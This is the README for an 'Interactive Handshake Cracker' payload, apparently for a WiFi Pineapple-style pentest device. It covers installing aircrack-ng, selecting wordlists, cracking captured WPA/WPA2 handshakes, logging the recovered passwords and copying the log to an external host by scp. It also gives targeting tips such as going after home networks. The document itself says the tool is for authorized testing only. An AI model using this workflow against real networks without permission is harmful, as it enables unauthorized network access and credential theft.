# Interactive Handshake Cracker

**Type:** User Payload
**Category:** Exfiltration
**Author:** sinX
**Version:** 1.0

## Description

Interactive payload for manually cracking WPA/WPA2 handshakes with full control over wordlist selection, target selection, and progress monitoring. Provides detailed feedback and saves results for later reference.

## Features

- **Interactive Selection**: Choose which handshake to crack
- **Progress Tracking**: Real-time status updates with spinner
- **Result Storage**: Saves all cracked passwords to a persistent log
- **Network Information**: Displays ESSID, BSSID, and file details
- **Success Notifications**: Visual, audio, and haptic feedback on success
- **Wordlist Statistics**: Shows wordlist size before cracking

## Requirements

- `aircrack-ng` installed on the Pager
- At least one wordlist file in `/root/wordlists/`
- One or more captured handshake files in `/root/loot/handshakes/`

## Installation

1. Copy this directory to `/root/payloads/user/exfiltration/handshake_cracker/`
2. Ensure the script is executable:
   ```bash
   chmod +x /root/payloads/user/exfiltration/handshake_cracker/payload.sh
   ```
3. Install aircrack-ng if not already installed:
   ```bash
   opkg update
   opkg install aircrack-ng
   ```
4. Create required directories:
   ```bash
   mkdir -p /root/wordlists
   mkdir -p /root/loot/handshakes
   ```

## Configuration

Edit the configuration section at the top of `payload.sh`:

```bash
# Default wordlist paths
WORDLIST_DIR="/root/wordlists"
DEFAULT_WORDLIST="$WORDLIST_DIR/rockyou.txt"

# Handshake directory
HANDSHAKE_DIR="/root/loot/handshakes"

# Results file
RESULTS_FILE="/root/cracked_passwords.txt"
```

## Usage

### From Pager Dashboard

1. Navigate to **Payloads** > **User Payloads**
2. Select **Exfiltration** > **Interactive Handshake Cracker**
3. Press the button to launch
4. Follow the on-screen prompts:
   - Confirm you want to crack handshakes
   - The payload will automatically select the most recent handshake
   - Confirm to start cracking
   - Wait for results

### Manual Execution via SSH

```bash
cd /root/payloads/user/exfiltration/handshake_cracker/
./payload.sh
```

## Workflow

1. **Capture Handshakes**: Use the Pager's recon features to capture WPA handshakes
2. **Upload Wordlist**: Transfer a wordlist to `/root/wordlists/` (use SCP, USB, etc.)
3. **Run Payload**: Launch the Interactive Handshake Cracker from dashboard
4. **View Results**: Check the Pager screen or `/root/cracked_passwords.txt`

## Output Format

Results are saved to `/root/cracked_passwords.txt`:
```
2026-02-11 15:45:23 | CoffeeShop_WiFi | AA:BB:CC:DD:EE:FF | password123
2026-02-11 16:12:09 | HomeNetwork | 11:22:33:44:55:66 | MySecurePass456
```

## Wordlist Recommendations

### Small Wordlists (Fast)
- `common-passwords.txt` (1,000 passwords) - 1-2 minutes
- `rockyou-top10k.txt` (10,000 passwords) - 5-15 minutes

### Medium Wordlists (Moderate)
- `rockyou-top100k.txt` (100,000 passwords) - 30-90 minutes
- Custom targeted wordlists

### Large Wordlists (Slow)
- `rockyou.txt` full (14 million passwords) - Hours to days
- **Not recommended** for Pager due to limited resources

### Getting Wordlists

Use the **Wordlist Manager** payload:
1. Navigate to **Payloads** > **User Payloads** > **General** > **Wordlist Manager**
2. Download common wordlists automatically

Or manually upload:
```bash
scp rockyou.txt root@172.16.42.1:/root/wordlists/
```

## Success/Failure Indicators

### Success
- **Green log messages**: "PASSWORD FOUND!"
- **Alert dialog**: Shows network name and password
- **Triple vibration**: Haptic confirmation
- **Victory tone**: Audio feedback (if enabled)
- **Log entry**: Saved to `/root/cracked_passwords.txt`

### Failure
- **Red log messages**: "PASSWORD NOT FOUND"
- **Error dialog**: "Password not found in wordlist"
- **Suggestion**: Try a different/larger wordlist

## Performance Tips

1. **Start Small**: Use small wordlists first (common-passwords.txt)
2. **Target Wisely**: Home networks often use weaker passwords than corporate
3. **Battery**: Plug in USB-C power for long cracks
4. **Parallel Testing**: Don't crack multiple handshakes simultaneously

## Troubleshooting

### "No handshakes found!"
- Verify handshakes are in `/root/loot/handshakes/`
- Check file format (must be `.pcap` or `.cap`)
- Ensure handshakes are complete and valid

### "Wordlist not found"
- Check `/root/wordlists/` exists and contains `.txt` files
- Verify `DEFAULT_WORDLIST` path in configuration
- Run Wordlist Manager to download wordlists

### "aircrack-ng not installed"
- Install: `opkg update && opkg install aircrack-ng`
- Check installation: `which aircrack-ng`

### Cracking takes forever
- Use a smaller wordlist
- The password may not be in your wordlist
- Consider offline cracking on a more powerful machine

## Advanced Usage

### Exporting Results

View all cracked passwords:
```bash
cat /root/cracked_passwords.txt
```

Export to external device:
```bash
scp /root/cracked_passwords.txt user@external-host:/path/
```

### Custom Wordlists

Create a custom wordlist:
```bash
cat > /root/wordlists/custom.txt << EOF
password123
Password1!
MyNetwork2024
EOF
```

Then update `DEFAULT_WORDLIST` in the configuration.

## Security & Legal Notice

This payload is intended for **authorized security testing only**. Only use against networks you own or have explicit written permission to test. Unauthorized access to computer networks is illegal.

## Related Payloads

- **Auto Handshake Cracker** (alerts/handshake_captured/auto_crack) - Automatic background cracking
- **Wordlist Manager** (user/general/wordlist_manager) - Download and manage wordlists
